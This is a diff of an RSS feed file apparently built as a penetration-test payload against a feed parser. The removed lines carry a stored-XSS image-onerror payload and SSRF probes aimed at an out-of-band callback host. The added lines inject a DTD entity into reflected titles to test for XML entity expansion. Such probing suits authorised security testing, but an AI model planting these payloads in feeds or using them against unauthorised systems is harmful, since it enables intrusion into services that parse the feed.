@@ -1,32 +1,15 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY test "VULN_SUCCESS" >
+]>
 <rss version="2.0">
   <channel>
-    <title>Logic Test</title>
+    <!-- We inject the entity into the title, which we know is reflected -->
+    <title>Status: &test;</title>
     <link>http://example.com</link>
-    <description>Testing for SSRF and XSS without DTD</description>
-    
     <item>
-      <title>SSRF and XSS Check</title>
+      <title>Item: &test;</title>
       <link>http://example.com</link>
-      
-      <!-- ATTACK 1: XSS -->
-      <!-- If this pops an alert, you have Stored XSS -->
-      <description><![CDATA[ 
-        <h3>Test</h3>
-        <img src=x onerror=alert(document.domain)> 
-      ]]></description>
-      
-      <!-- ATTACK 2: SSRF via Image Tag -->
-      <!-- Some parsers scrape this URL to show a thumbnail -->
-      <image>
-        <url>http://http://phsrenjcxgefqbuibhlmmzh9nflr3gcop.oast.fun/image_test.jpg</url>
-        <title>Test Image</title>
-        <link>http://example.com</link>
-      </image>
-
-      <!-- ATTACK 3: SSRF via Enclosure -->
-      <!-- The server might try to download this to check file size -->
-      <enclosure url="phsrenjcxgefqbuibhlmmzh9nflr3gcop.oast.fun/enclosure_test.mp3" length="1234" type="audio/mpeg" />
     </item>
   </channel>
 </rss>
